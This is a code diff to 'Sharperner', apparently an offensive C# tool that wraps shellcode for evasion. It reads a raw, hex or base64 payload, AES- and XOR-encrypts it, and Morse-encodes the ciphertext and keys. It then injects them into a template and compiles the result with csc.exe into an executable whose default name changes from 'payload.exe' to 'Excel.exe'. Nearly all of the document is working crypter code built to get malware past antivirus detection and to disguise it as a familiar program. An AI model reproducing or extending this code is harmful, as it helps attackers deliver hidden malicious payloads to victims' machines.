@@ -10,6 +10,58 @@ using System.Text.RegularExpressions;
 
 namespace Sharperner
 {
+    //https://stackoverflow.com/questions/59248316/c-sharp-morse-decoder
+    public class MorseForFun
+    {
+        private static Dictionary<char, string> _morseAlphabetDictionary;
+
+        public static void InitializeDictionary()
+        {
+            _morseAlphabetDictionary = new Dictionary<char, string>()
+                                   {
+{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
+                                   };
+        }
+
+        public static string Send(string input)
+        {
+            StringBuilder stringBuilder = new StringBuilder();
+
+            foreach (char character in input)
+            {
+                if (_morseAlphabetDictionary.ContainsKey(character))
+                {
+                    stringBuilder.Append(_morseAlphabetDictionary[character] + " ");
+                }
+                else
+                {
+                    stringBuilder.Append(character + " ");
+                }
+            }
+
+            return stringBuilder.ToString();
+        }
+        public static string Receive(string input)
+        {
+            StringBuilder stringBuilder = new StringBuilder();
+
+            string[] codes = input.Split(' ');
+
+            foreach (var code in codes)
+            {
+                foreach (char keyVar in _morseAlphabetDictionary.Keys)
+                {
+                    if(_morseAlphabetDictionary[keyVar] == code)
+                    {
+                        stringBuilder.Append(keyVar);
+                    }
+                }
+            }
+
+            return stringBuilder.ToString();
+        }
+    }
+
     class Program
     {
         private static bool IsBase64String(string base64)
@@ -79,14 +131,14 @@ namespace Sharperner
 
         //https://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C
         //https://gist.github.com/RichardHan/0848a25d9466a21f1f38
-        public static byte[] AESEncrypt(byte[] clearData, byte[] Key, byte[] IV)
+        public static byte[] AESEncrypt(byte[] clearData, string aes_key, string aes_iv)
         {
             MemoryStream ms = new MemoryStream();
 
             Rijndael alg = Rijndael.Create();
 
-            alg.Key = Key;
-            alg.IV = IV;
+            alg.Key = Convert.FromBase64String(aes_key);
+            alg.IV = Convert.FromBase64String(aes_iv);
 
             CryptoStream cs = new CryptoStream(ms,
                alg.CreateEncryptor(), CryptoStreamMode.Write);
@@ -108,6 +160,48 @@ namespace Sharperner
                              .Where(x => x % 2 == 0)
                              .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                              .ToArray();
+        }
+
+        public static string GetRandomIV()
+        {
+            byte[] iv = new byte[16];
+
+            for (int i = 0; i < 16; i++)
+            {
+                random.NextBytes(iv);
+            }
+            //StringBuilder IVStr = new StringBuilder(iv.Length);
+            //foreach (byte b in iv)
+            //{
+            //    IVStr.AppendFormat("0x{0:x2}", b);
+            //    if (!b.Equals(iv.Last()))
+            //    {
+            //        IVStr.Append(",");
+            //    }
+            //}
+            //return IVStr.ToString();
+            return Convert.ToBase64String(iv);
+        }
+
+        public static string GetRandomKey()
+        {
+            byte[] key = new byte[32];
+
+            for (int i = 0; i < 32; i++)
+            {
+                random.NextBytes(key);
+            }
+            //StringBuilder IVStr = new StringBuilder(iv.Length);
+            //foreach (byte b in iv)
+            //{
+            //    IVStr.AppendFormat("0x{0:x2}", b);
+            //    if (!b.Equals(iv.Last()))
+            //    {
+            //        IVStr.Append(",");
+            //    }
+            //}
+            //return IVStr.ToString();
+            return Convert.ToBase64String(key);
         }
 
         public static void banner()
@@ -147,8 +241,12 @@ Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
             string xorAesEncStringB64 = "";
             byte[] rawSh3lLc0d3 = new byte[] { };
             byte[] aesEncByte = new byte[] { };
-            byte[] key = new byte[32] { 0x81, 0x8a, 0xba, 0x08, 0xe0, 0xf0, 0x29, 0x7b, 0xe6, 0x6d, 0xf4, 0xa5, 0x66, 0x37, 0xec, 0x0e, 0x31, 0x8e, 0xa8, 0xae, 0x0e, 0x06, 0xa8, 0xab, 0x53, 0xcf, 0xcf, 0x99, 0x4a, 0xca, 0xc8, 0xc8 };
-            byte[] iv = new byte[16] { 0x9d, 0xa8, 0xd3, 0xb1, 0xe2, 0xc9, 0x6b, 0xe9, 0x5d, 0x3a, 0x29, 0x04, 0xc1, 0x83, 0x57, 0x68 };
+            string morsed_aeskey = "";
+            string morsed_aesiv = "";
+
+            // generate random aes key and iv
+            string aes_key = GetRandomKey();
+            string aes_iv = GetRandomIV();
 
             banner();
 
@@ -184,20 +282,20 @@ Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
                         {
                             Console.WriteLine("[+] Hex payload detected.");
                             rawSh3lLc0d3 = StringToByteArray(File.ReadAllText(filePath));
-                            aesEncByte = AESEncrypt(rawSh3lLc0d3, key, iv);
+                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                         }
                         else if (isBinary(filePath))
                         {
                             Console.WriteLine("[+] Raw payload detected.");
                             rawSh3lLc0d3 = File.ReadAllBytes(filePath);
-                            aesEncByte = AESEncrypt(rawSh3lLc0d3, key, iv);
+                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                         }
                         else if (IsBase64String(File.ReadAllText(filePath)))
                         {
                             Console.WriteLine("[+] Base64 input detected. Converting base64 to bytes");
                             base64String = File.ReadAllText(filePath);
                             rawSh3lLc0d3 = Convert.FromBase64String(base64String);
-                            aesEncByte = AESEncrypt(rawSh3lLc0d3, key, iv);
+                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                         }
                         else
                         {
@@ -208,7 +306,16 @@ Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
                         // XOR
                         byte[] xorAesEncByte = xorEncDec(aesEncByte, xorKey);
 
-                        xorAesEncStringB64 = Convert.ToBase64String(xorAesEncByte);
+                        // back in the history
+                        MorseForFun.InitializeDictionary();
+
+                        xorAesEncStringB64 = MorseForFun.Send(Convert.ToBase64String(xorAesEncByte));
+                        morsed_aeskey = MorseForFun.Send(aes_key);
+                        morsed_aesiv = MorseForFun.Send(aes_iv);
+                        xorKey = MorseForFun.Send(xorKey);
+
+                        //Console.WriteLine($"Sending morse which is here: {MorseForFun.Send(xorAesEncStringB64)}");
+                        //Console.WriteLine($"Sending morse which is here: {MorseForFun.Receive(MorseForFun.Send(xorAesEncStringB64))}");
 
                         Console.WriteLine("[+] Payload is now AES and XOR encrypted!");
                     }
@@ -238,9 +345,10 @@ Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
                 }
                 else
                 {
-                    outputFile = "payload.exe";
+                    outputFile = "Excel.exe";
                 }
 
+                //https://stackoverflow.com/questions/5036590/how-to-retrieve-certificates-from-a-pfx-file-with-c
 
                 //Console.WriteLine($"XOR encrypted text: {xorAesEncStringB64}");
 
@@ -289,8 +397,9 @@ Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
                 {
                     templateFileContent = File.ReadAllText(templateFile);
                 }
-                // replace "string xoredB64" line
-                templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY",xorKey);
+                // replace in template file
+                templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY",xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
+                
                 // write all back into the file
                 try
                 {
@@ -303,6 +412,7 @@ Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
                 }
 
                 //compile the code
+                //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.standarderror?redirectedfrom=MSDN&view=net-5.0#System_Diagnostics_Process_StandardError
                 string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
                 try
                 {
@@ -311,7 +421,7 @@ Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
                 }
                 catch (Exception err)
                 {
-                    Console.WriteLine($"[!] Error generating executable file with the following error {err.Message}");
+                    Console.WriteLine($"[!] Error compiling template file with the following error {err.Message}");
                 }
 
                 Console.WriteLine($"[+] Doing some cleaning...");
